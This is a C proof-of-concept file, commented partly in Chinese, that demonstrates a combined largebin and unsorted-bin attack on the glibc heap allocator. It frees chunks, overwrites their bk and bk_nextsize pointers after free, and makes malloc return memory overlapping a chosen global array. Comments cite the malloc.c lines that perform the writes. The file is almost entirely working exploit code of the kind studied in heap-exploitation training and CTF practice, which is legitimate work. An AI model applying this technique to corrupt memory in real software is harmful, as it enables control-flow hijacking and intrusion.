#include<stdio.h>
#include<stdlib.h>
//gcc test.c -fPIE -pie -o test -g
/*largebin&&unsortbin attack poc*/
long long padding[0x10]={0xdeadbeef};
long long target[0x100]={0xdeadbeef};
long long padding1[0x10]={0xdeadbeef};
int main(){
    
    void *head=((void *)target)-0x20;
    fprintf(stderr,"target:%p, target_value:0x%08x\n",target,target[0]);
    malloc(0x20);
    long long *chunk0=malloc(0x408);
    malloc(0x20);
    long long *chunk1=malloc(0x418); 
    //unsortbin chunk size >largebin chunk
    //size需要在同一个largebin中 ？
    malloc(0x20);
    free(chunk0);
    free(chunk1);
    chunk1=malloc(0x418); 
    // chunk1-unsortbin chunk0-in_largebin
    free(chunk1);
    
    chunk1[0]=0;
    chunk1[1]=head; //从unsortbin取出时，unsortbin attack写head+0x10
    
    chunk0[0]=chunk0[2]=0;
    chunk0[1]=head+8; //malloc.c:3591 写head+0x18 即 fake_bk
    chunk0[3]=head-0x18-5;// malloc.c:3578? 写chunk头部，因为开了pie所以开头为0x55或者0x56，当为0x56时可以成功

    long long *res=malloc(0x48); //分配到的res在target-0x10的位置,也就是head+0x10的位置
    fprintf(stderr,"res:%p, res:0x%08x\n",res,res[2]);
    return 0;
    //b test.c:28  b malloc.c:3472 malloc.c:3591
}
